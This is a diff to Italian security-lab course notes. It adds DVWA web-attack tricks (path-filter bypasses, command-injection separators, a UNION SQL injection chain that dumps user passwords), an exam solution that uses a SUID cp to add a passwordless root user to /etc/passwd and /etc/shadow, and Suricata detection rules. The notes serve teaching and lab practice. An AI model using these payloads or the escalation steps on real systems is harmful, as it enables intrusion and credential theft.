@@ -9,8 +9,9 @@
 #show ref: set text(green)
 
 #set page(margin: (y: 0.5cm))
+#set page(margin: (x: 1cm))
 
-#set text(15pt)
+#set text(14pt)
 
 #set heading(numbering: "1.1.1.1.1.1")
 //#set math.equation(numbering: "(1)")
@@ -64,9 +65,60 @@
 #align(center, text(15pt, author))
 #v(8.35mm, weak: true)
 
-
+#outline()
 
 = Laboratorio
+
+== Web Security
+=== File inclusion
+- Se è impossibile inserire nell'URL una stringa che inizia con `"/etc"` si può usare la doppia barra `//etc/passwd`
+- Si può baypassare un filtro su `"http://"` utilizzando delle lettere maiuscole: `"Http://"`
+
+
+=== Command injection
+
+- Si possono usare `&&, ||, ;` per concatenare dei comandi
+  - si possono usare ad esempio al posto dell'argomento che il form si aspetta:
+    -  `|| ls`
+    -  `& ls`
+    -  `| ls`
+  -  Ricordarsi di provare con e senza spazi
+
+
+
+=== SQL Injection
+
+- Bisogna capire quanto colonne ha la query precedente (cioè quella valida per il form)
+  - Ad esempio, nell'applicazione DVWA chiede l'id di un utente, noi allora inseriamo una query del tipo
+  ```SQL
+  1' UNION SELECT NULL,NULL #
+  ```
+  con tanti `NULL` quante sono le colonne; questo lo si scopre a tentativi; il `#` serve a commentare tutto ciò che viene dopo, per evitare problemi
+- Ora possiamo inserire le query SQL che vogliamo come n-esimo elemento della SELECT (con n numero delle colonne)
+  - In DVWA proviamo a reperire le informazioni sul database con
+  ```SQL
+  1' UNION SELECT NULL,schema_name FROM information_schema.schemata #
+  ```
+  - In questo caso ci restituisce tutti i Name e Surname possibili
+  - Per elencare invece tutte le tabelle:
+  ```SQL
+  1' UNION SELECT NULL,table_name FROM information_schema.tables #
+  ```
+  - Prendiamo solo le tabelle con nome "users"
+  ```SQL
+  1' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name="users"  #
+  ```
+  - Ora, per scoprire `user` e `password`
+  ```SQL
+  1' UNION SELECT user,password FROM users #
+  ```
+- Impostando il livello medium in DVWA non possiamo usare gli apici singoli direttamente nella richiesta, quindi li togliamo, e inoltre non possiamo inserire la richiesta direttamente in un form perché non c'è. Quindi utilizziamo `burp`
+  - Intercettiamo la richiesta
+  - Codifichiamo la seguente query in formato URL con burp (sezione Decoder)
+  ```SQL
+  1 UNION SELECT user,password FROM users #
+  ```
+  - E scriviamo, al posto dell'id nella richiesta HTTP originale, la nostra query codificata
 
 == Binary Exploit
 
@@ -195,6 +247,14 @@
   ```
   Provare gli esercizi di prima compilando senza flag `-z execnostack`
 
+
+
+== Suricata
+- Per visualizzare i log in formato `json` di suricata si può usare il `jq`
+  ```bash
+  tail -f /var/log/suricata/eve.json | jq 'select(.event_type="alert")'
+  ```
+  e si può, come in questo caso, specificare anche un filtro (quindi fa una banale `grep`)
 
 = Base64
 - Per il trasferimento di file con HTTP si usa la codifica Base64
@@ -752,3 +812,64 @@ Consegnare un file report.pdf che contenga:
 - L'indirizzo della variabile `SHELL` è `0xffffd517`, quindi per avere la stringa che contenga solo il path dobbiamo aggiungere 6 byte all'indirizzo, ottenendo `FFFFD51D`
 - L'indirizzo di `system` `0xf7c4c830`
 - L'indirizzo di `exit` è `0xf7c3c130`
+
+= Esami
+== Integrity check e privilege escalation - 9 gennaio 2023
+=== Testo
+ Scaricare il file `change1` e renderlo eseguibile
+```bash
+  $ chmod +x ./change1
+```
+Il comando apporta una modifica a un file dentro /usr/bin
+
+Fase 1:
+
+- ideare un modo di identificare il file modificato e il tipo di modifica apportata.
+- lanciare ```bash sudo ./change1```
+- attuare la strategia ideata al punto 1 per identificare il file modificato e il tipo di modifica apportata.
+- documentare tutti i passi svolti in modo dettagliato nel file integrity.txt
+
+Fase 2:
+catturate i comandi seguenti e l'output in uno screenshot privesc.png
+
+- usate come utente kali senza sudo il file modificato dal comando change1, per inserire nei file in /etc/passwd ed /etc/shadow le righe opportune per "creare" un utente di nome toor con privilegi di root e senza password (ricordate che esistono le man page)
+- da kali diventate toor e lanciate id
+
+=== Soluzione
+Fase 1:
+- Per monitorare cambiamenti al file system usiamo AIDE
+- Tenendo conto del file di configurazione standard, aggiungiamo la seguente riga a tale file  
+  ```bash
+  /usr/bin SecLabRule
+  ```
+- Lanciamo `aideinit`, così da creare un database
+- Lanciamo il file malevolo con sudo
+  ```bash
+  sudo ./change1
+  ```
+- E verifichiamo le modifiche con il comando
+  ```bash
+  aide -c /etc/aide/aide.conf -C
+  ```
+- Dall'ouput di aide si evince che l'eseguibile ha modificato i permessi del binario `/usr/bin/cp`, settando il SUID a 1
+  
+Fase 2:
+```bash
+cp /etc/passwd ~/p
+cp /etc/shadow ~/s
+cat ~/p  > ~/passwd
+cat ~/s > ~/shadow
+echo "toor:x:0:0::/root:/bin/bash" >> ~/passwd
+echo "toor::19509:0:99999:7:::" >> ~/shadow
+cp ~/passwd /etc/passwd
+cp ~/shadow /etc/shadow
+```
+*N.B.* questo procedimento non richiede di inserire alcuna password per autenticarsi come `toor`
+
+== Suricata - richiesta a uno specifico sito - Esercizio 10 febbraio 2023
+Scrivere una (o più) regola suricata in modalità alert per qualsiasi richiesta a evilcorp.com. Nota bene NON è possibile utilizzare il protocollo http o la porta 80 per creare questa regola.
+```bash
+
+alert dns any any -> any any (msg:"DNS query for evilcorp.com"; dns_query; content:"evilcorp.com"; sid:100002; rev:1;)
+alert ip any any -> evilcorp.com any (msg:"Request for evilcorp.com"; sid:100003; rev:1;)
+```
